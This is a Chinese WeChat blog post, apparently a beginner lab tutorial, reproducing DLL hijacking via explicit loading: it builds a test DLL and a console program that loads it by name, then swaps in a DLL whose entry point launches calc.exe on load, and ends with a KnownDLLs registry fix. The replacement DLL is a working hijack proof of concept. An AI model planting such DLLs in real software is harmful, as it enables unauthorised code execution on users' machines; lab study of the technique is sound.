---
title: DLL 劫持复现记录（显式加载）
url: https://mp.weixin.qq.com/s/xtGFMRLNafQ27jLNRRDPeA
source: Doonsec's feed
date: 2026-01-08
fetch_date: 2026-01-09T03:28:31.888291
---

# DLL 劫持复现记录（显式加载）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPI8Hu4mCEics5Ou25aCff0w3GY9MXxbWwsAUicsuD1VkwNV9iaicH12U2UiaQ/0?wx_fmt=jpeg)

# DLL 劫持复现记录（显式加载）

原创

huan666

huan666

![]()

在小说阅读器中沉浸阅读

相关代码来源于互联网，适用于新手小白，大佬绕行！！！

一、显式加载原理

`程序在运行过程中，通过主动调用Windows API函数，比如LoadLibrary，来加载指定的DLL，再通过GetProcAddress获取 DLL 中函数的地址，最后手动调用函数FreeLibrary、释放 DLL。`

二、环境搭建

编辑器：Visual Studio

进程查看工具：process-explorer

下载地址：

https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer

创建DLL1.dll：

1、新建动态链接库(DLL)项目-->下一步-->默认-->创建项目

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPItnkficBicaxOq4Ru8umnYldgGvFPonU3jMO9vwNSy3ynS2Pibto9ou79A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIPseaiarhFpRuSIjM7SqddK8ribMw4vEM66eib1LC8I9mSIrQBoNXDy1YA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPI3jJib3K3TmdXJmgUFiaUwTdfso61qBicjD1etqeicDak8VWggQRP4j7icYg/640?wx_fmt=png&from=appmsg)

2、修改dllmain.cpp文件

```
#include "pch.h"
// 定义原DLL的核心函数：DLL1已被成功加载！！！void dllmsg() {    MessageBox(0, L"DLL1已被成功加载！！！", L"Good", 0);}
// DLL入口函数（默认生成，无需修改）BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

3、修改framework.h文件

添加 Windows 头文件和函数导出声明（让外部 EXE 能调用dll`msg()`函数）

```
#pragma once#define WIN32_LEAN_AND_MEAN  // 从 Windows 头文件中排除极少使用的内容#include <windows.h>  // 包含MessageBox所需的Windows API头文件
// 导出msg函数：extern "C"避免C++名字粉碎，__declspec(dllexport)标记为导出函数extern "C" __declspec(dllexport) void dllmsg(void);
```

4、点击生成-生成解决方案，编译生成dll文件，先选择Release，再生成解决方案

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIZM7icxknC2PSSp2E1ZkdMGXSIN9x7cVzk2vzdvBSWGVVsia9KicI2cv7Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIicjO1RYuzNVuXGxCp1awTRuxsicWbW8iatoJL2crJmRxh5FqQxX2RzNibQ/640?wx_fmt=png&from=appmsg)

dll文件路径，在控制台日志中可查看。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIwAkeq2ibRTKgYDpmCDjpSNtaXMcfGtDJfEDgADicY0iaYWhZKRgRARKGw/640?wx_fmt=png&from=appmsg)

创建ConsoleApplication1.exe：

1、创建新项目-->控制台应用-->下一步-->创建

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIsWCSrtQGd0xD30KoaOoGpvdj1ic4J3nHXZLaUBrLibepfOicViaxhJnSUQ/640?wx_fmt=png&from=appmsg)

2、编辑ConsoleApplication1.cpp文件

```
#include <iostream>#include <Windows.h>using namespace std;
int main(){    // 定义函数指针类型，匹配msg()的参数和返回值    typedef void(*DLLFUNC)(void);    DLLFUNC GetDllfunc = NULL;
    // 动态加载Dll1.dll（需确保EXE与DLL在同一目录）    HINSTANCE hinst = LoadLibrary(L"Dll1.dll");    if (hinst != NULL) {        // 获取DLL中导出函数msg的地址        GetDllfunc = (DLLFUNC)GetProcAddress(hinst, "dllmsg");    }
    // 调用dllmsg()函数（若获取地址成功）    if (GetDllfunc != NULL) {        (*GetDllfunc)();    }
    return 0;}
```

3、点击生成-->生成解决方案

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIEIVfmcJM3HokX0xJF45HYCKU0hbHRDMzugvm5gicku6tjQ7tPeB7Lnw/640?wx_fmt=png&from=appmsg)

将ConsoleApplication1.exe和Dll1.dll放在同一目录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIrjYFceibiaHeSr3ccibKxyNk4sQLnwntzI7dJ9wy718clGPsK0EWZOYZw/640?wx_fmt=png&from=appmsg)

运行ConsoleApplication1.exe，Dll1.dll已被加载

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIEqggia706goMMkxkw23WKkGOKOaxBxF8TDboCIh48iaHFib7IYNzPjV6A/640?wx_fmt=png&from=appmsg)

三、劫持复现

运行process-explorer，查看ConsoleApplication1.exe加载哪些DLL文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIdgCicfYRRJ7I48vr0RO3X8ELtXrkJHW92K7omcibDUDpf552JMFsrjrA/640?wx_fmt=png&from=appmsg)

点击View-->Show Lower Pane，可查看加载的DLL文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIwQJVf4BRGe8pnV2sTT70Uxtl4QVtzjB1wdiaRbXicvEhibbSxlnGqWKibQ/640?wx_fmt=png&from=appmsg)

通过加载的DLL，发现C:\Users\huan666-pc\Desktop\test\Dll1.dll

被加载，并且在当前程序目录下，修改Dll1.dll文件为执行任意系统命令。

编写一个弹出计算器的DLL文件，文件名最后改为Dll1.dll

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"// 包含Windows API头文件，用于调用系统函数#include <Windows.h>
// 定义弹出计算器的函数void OpenCalculator() {    // 核心API：WinExec 执行系统命令，calc.exe是计算器程序    // SW_SHOW：显示计算器窗口（不隐藏）    // 注意：WinExec在新系统中仍可用，也可以用CreateProcess（更推荐，后面会补充）    WinExec("calc.exe", SW_SHOW);
    // 【可选】更健壮的写法（替代WinExec，推荐）    /*    STARTUPINFO si = { 0 };    PROCESS_INFORMATION pi = { 0 };    si.cb = sizeof(STARTUPINFO);    // 创建新进程运行计算器    CreateProcessA(NULL, "calc.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);    // 关闭进程/线程句柄，释放资源    CloseHandle(pi.hProcess);    CloseHandle(pi.hThread);    */}
BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        // DLL被进程加载时，执行弹出计算器的函数        OpenCalculator();        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

编译成DLL文件后，复制到劫持复现的目录下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPI7rYzBQEIMibmfuN9aJpd8lbdgOMmZeSXyW2BaTvXrULWpqvbyfNyPCg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCKz7FarRX3DziaibHtOwVEPIHEabCEPJXqMyuw4fpTb7TEuXGAYribScjaa5vzO3Q1qkSzdlAXr5pFA/640?wx_fmt=png&from=appmsg)

四、修复方案

注册表中修改，打开注册表：WIN+R-->regedit

\HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs路径下定义加载的DLL，该目录下的DLL文件就会被禁止从EXE自身目录调用，而只能从系统目录加载。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCvrGDvhXFeRoC0mrq0ibKnCh6gU7HPJjiaZoqsxyafkmgdHsIRJXSAy1zD7FDAOVlZNBCSON6FibPIg/0?wx_fmt=png)

huan666

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9Fia8sxkoIGCvrGDvhXFeRoC0mrq0ibKnCh6gU7HPJjiaZoqsxyafkmgdHsIRJXSAy1zD7FDAOVlZNBCSON6FibPIg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过